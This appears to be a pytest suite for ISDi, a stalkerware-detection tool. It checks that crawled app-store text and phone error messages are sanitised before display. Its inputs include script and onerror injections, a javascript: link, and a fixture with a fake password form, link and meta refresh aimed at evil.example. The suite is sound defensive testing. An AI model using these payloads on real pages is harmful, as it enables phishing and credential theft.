"""Text ISDi does not write is never rendered as markup.

Store descriptions come from Play Store and App Store crawls: whoever
publishes an app, a stalkerware vendor included, controls that text. The
content security policy stops inline scripts, but not a form, a link or a
meta refresh. Scan errors can carry text from the phone.
"""

import pytest

from isdi.config import get_config
from isdi.htmlclean import clean_description
from isdi.scanner import AppScanner, db
from isdi.web.view import scan as scan_view

# --- the cleaner (ported from Sherloc, with its tests) ---------------------------


def test_script_is_removed_with_its_content():
    assert clean_description("a<script>alert(1)</script>b") == "ab"


def test_style_is_removed_with_its_content():
    assert clean_description("a<style>body{x:y}</style>b") == "ab"


def test_attributes_are_stripped_from_allowed_tags():
    assert clean_description('<b onclick="x()" class="c">t</b>') == "<b>t</b>"


def test_disallowed_tags_are_dropped_but_their_text_is_kept():
    assert clean_description('<a href="javascript:x()">go</a>') == "go"
    assert clean_description("<iframe src=x></iframe>text") == "text"
    assert clean_description("<img src=x onerror=y>") == ""


def test_forms_and_meta_refresh_are_dropped():
    html = '<form action="https://evil.example/"><input name=p></form><meta http-equiv="refresh" content="0;url=https://evil.example/">ok'
    assert clean_description(html) == "ok"


def test_text_is_escaped():
    assert clean_description("1 < 2 & 3 > 2") == "1 &lt; 2 &amp; 3 &gt; 2"
    assert clean_description("&lt;script&gt;") == "&lt;script&gt;"


def test_allowed_formatting_survives():
    html = "<p>One<br>Two</p><ul><li>a</li><li><i>b</i></li></ul>"
    assert clean_description(html) == html


def test_unclosed_tags_are_closed():
    assert clean_description("<b>bold") == "<b>bold</b>"


def test_stray_closing_tags_are_ignored():
    assert clean_description("a</b>b</script>c") == "abc"


@pytest.mark.parametrize("value", [None, float("nan"), 3, b"<b>x</b>"])
def test_non_strings_become_empty(value):
    assert clean_description(value) == ""


# --- the app page ------------------------------------------------------------------

HOSTILE = (
    '<p>Track your family.</p><form action="https://evil.example/login">'
    '<input name="password"></form><a href="https://evil.example/">Update ISDi</a>'
    '<meta http-equiv="refresh" content="0;url=https://evil.example/">'
)


def _store(app, appid):
    with app.app_context():
        scanid = db.create_scan(
            {
                "clientid": "20260101_001",
                "serial": get_config().hmac_serial("HOSTILE-1"),
                "device": "android",
                "device_model": "m",
                "device_version": "1",
                "device_manufacturer": "x",
                "last_full_charge": "",
                "device_primary_user": "Phone",
                "is_rooted": False,
                "rooted_reasons": "[]",
            }
        )
        db.create_mult_appinfo([(scanid, appid, "[]", "", "<new>")])
        row = db.app_row_ids(scanid)[appid]
    return f"/scan/{scanid}/app/{row}"


@pytest.fixture
def hostile_store_text(app, monkeypatch):
    def fake_details(self, serial, appid, stored=False, scanid=None):
        return {
            "title": "Spy<b>Pro</b>",
            "summary": '<img src=x>Keep <i>watch</i><a href="https://evil.example/">here</a>',
            "descriptionHTML": HOSTILE,
            "permissions": [],
        }, {"versionName": "1.0"}

    monkeypatch.setattr(AppScanner, "app_details", fake_details)
    return _store(app, "com.example.hostile")


def test_store_description_is_cleaned_on_the_app_page(client, hostile_store_text):
    html = client.get(hostile_store_text).get_data(as_text=True)
    assert "<p>Track your family.</p>" in html
    assert "Update ISDi" in html  # the link's text stays, the link does not
    assert "evil.example" not in html
    assert "<form action=" not in html and 'http-equiv="refresh"' not in html


def test_store_summary_is_cleaned_on_the_app_page(client, hostile_store_text):
    html = client.get(hostile_store_text).get_data(as_text=True)
    assert "Keep <i>watch</i>here" in html
    assert "<img src=x>" not in html


def test_store_title_is_escaped(client, hostile_store_text):
    html = client.get(hostile_store_text).get_data(as_text=True)
    assert "Spy&lt;b&gt;Pro&lt;/b&gt;" in html


# --- scan errors -------------------------------------------------------------------


def test_scan_exception_text_is_escaped(monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("adb said <img src=x> & <a href=//evil.example>")

    monkeypatch.setattr(scan_view, "_run_live_scan", boom)
    job = scan_view._create_scan_job("20260101_001", "android", "Phone", "SER1")
    scan_view._scan_job(job, "20260101_001", "android", "Phone", "SER1", False, False)
    state = scan_view._get_scan_job(job)
    assert state["status"] == "error"
    assert "<img" not in state["error"] and "<a " not in state["error"]
    assert "&lt;img src=x&gt; &amp;" in state["error"]
    assert state["message"] == state["error"]
